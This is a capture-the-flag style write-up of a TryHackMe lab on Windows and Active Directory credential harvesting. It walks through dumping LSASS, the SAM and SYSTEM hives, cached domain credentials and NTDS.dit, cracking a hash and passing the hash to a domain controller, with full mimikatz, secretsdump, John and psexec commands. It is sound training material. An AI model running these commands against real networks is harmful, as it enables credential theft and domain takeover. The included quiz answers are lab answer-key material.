# Intro to Credential Harvesting – Premium Room 

When I began this room, I reminded myself of one important truth:  
> Exploits may get you in, but **credentials move you around**.  

To prepare, I studied how Windows and Active Directory actually store credentials. Understanding the “where” makes the “how” of stealing them much easier.  

---

## Windows & Active Directory Credential Stores

Windows and Active Directory store credentials in different places, depending on whether a system is standalone or domain-joined. Each store exists for a reason (like enabling SSO or offline logons), but for us as attackers, these represent *harvest points*.  

Here’s the breakdown I walked through:

- **LSASS Memory**  
  The Local Security Authority Subsystem Service holds NTLM/LM hashes, Kerberos tickets, and sometimes plaintext creds in memory. It powers Single Sign-On. With SYSTEM access, attackers dump LSASS to pull these secrets.  
  🔧 *Tool*: mimikatz → `sekurlsa::logonpasswords`

- **SAM + SYSTEM Hives**  
  The Security Accounts Manager (SAM) stores local user password hashes, encrypted with a key from the SYSTEM hive. Dumping both lets us decrypt local account hashes.  
  🔧 *Tools*: reg export, mimikatz → `lsadump::sam`

- **LSA Secrets**  
  Stored under `HKLM\SECURITY\Policy\Secrets`, these contain cached domain creds, plaintext service creds, and sometimes RDP passwords.  
  🔧 *Tool*: secretsdump.py with local admin creds

- **DPAPI Vault**  
  Windows uses the Data Protection API to store application secrets (Wi-Fi, RDP, browser passwords). The vault uses a user’s master key, tied to their logon password. If we dump and decrypt, we unlock all those secrets.  
  🔧 *Tool*: mimikatz → `vault::list` + `vault::cred /export`

- **NTDS.dit**  
  On Domain Controllers, this is the crown jewel: the AD database storing every domain account’s NTLM hashes and Kerberos keys. If stolen, attackers control the domain.  
  🔧 *Tools*: secretsdump.py → `-just-dc`, mimikatz → `lsadump::dcsync`

📊 **Quick Reference Table**

| Store          | What it holds                                      | Access method                      | Tool / Command |
|----------------|----------------------------------------------------|------------------------------------|----------------|
| LSASS Memory   | NTLM/LM hashes, Kerberos tickets, plaintext creds  | Dump `lsass.exe` live memory       | `mimikatz sekurlsa::logonpasswords` |
| SAM + SYSTEM   | Local account password hashes                      | Export hives, recover with SYSTEM  | `mimikatz lsadump::sam` |
| LSA Secrets    | Cached domain creds, plaintext service credentials | LSARPC / registry read             | `secretsdump.py` |
| DPAPI Vault    | Browser, RDP, Wi-Fi credentials                    | Export + decrypt with master key   | `mimikatz vault::cred /export` |
| NTDS.dit       | Full domain user DB (hashes + keys)                | Replication / offline dump         | `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync` |

Armed with this mental model, I moved on to harvesting.  

---

## Connecting to the Target

The lab provided me with **local Administrator credentials**:

- Username: `Administrator`  
- Password: `N3w34829DJdd?1`  
- Target IP: `10.220.10.20`  

I connected via RDP from my AttackBox:  

```bash
xfreerdp /u:Administrator /p:'N3w34829DJdd?1' /v:10.220.10.20
```

Now inside WRK as local admin, the hunt began.  

---

## Step 1 – Dumping LSASS Memory

I launched mimikatz, enabled debug privileges, and pulled live credentials:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

✅ Found:  
- `svc-app` → password `S3rv!c3A***!`  
- `ElonTusk` web creds → password `MyTusksAreTha***`  

---

## Step 2 – Dumping DPAPI Vault

```text
mimikatz # vault::list
mimikatz # vault::cred /export
```

✅ Confirmed same two secrets (svc-app + ElonTusk’s Gmail).  

---

## Step 3 – Extracting SAM + SYSTEM Hives

From PowerShell:

```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

Then in mimikatz:

```text
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
```

✅ Dumped local account hashes (Administrator, Guest, ElonTusk).  

---

## Step 4 – Dumping Cached Domain Credentials

```text
mimikatz # token::elevate
mimikatz # lsadump::cache
```

✅ Got MSCacheV2 hashes for domain users (`raoulduke`, `svc-app`, `Administrator`).  

---

## Step 5 – Secretsdump (Remote Dumping)

On Kali:

```bash
secretsdump.py WRK/Administrator:'N3w34829DJdd?1'@10.220.10.20 -output local_dump
```

✅ Extracted local hashes + cached domain logons.  

Cracked **drgonzo’s MSCache hash** with John:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password revealed: `lasve***1`.  

---

## Step 6 – Dumping NTDS.dit from the DC

```bash
secretsdump.py TRYHACKME/drgonzo:'lasve***1'@10.220.10.10 -just-dc -output dc_dump
```

✅ Retrieved NTDS.dit dump, including Domain Administrator NTLM hash:  
`d71ee9fb6a3f5****6bdc6c941f7a2903`  

---

## Step 7 – Pass-the-Hash to Domain Controller

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f5****6bdc6c941f7a2903
```

✅ Shell as **NT AUTHORITY\SYSTEM** on DC.  

---

## Step 8 – The Final Flag

```cmd
cd C:\Users\Administrator\Desktop
type flag.txt
```

✅ Flag: `THM{gotta_l0ve_**********_st0res}`  

---

## Knowledge Check Q&A

- **Which Windows component stores active NTLM and Kerberos credentials in memory?**  
  ➡️ **LSASS**  

- **What file in the `C:\Windows\NTDS\` directory contains the AD database?**  
  ➡️ **ntds.dit**  

- **Which Mimikatz command exports DPAPI Vault credentials?**  
  ➡️ **vault::cred /export**  

---

## Reflection

By chaining together all five credential stores, I went from **local Administrator** on a single workstation → **Domain Admin** on the DC. No exploits needed, just the creds Windows was already holding onto.  
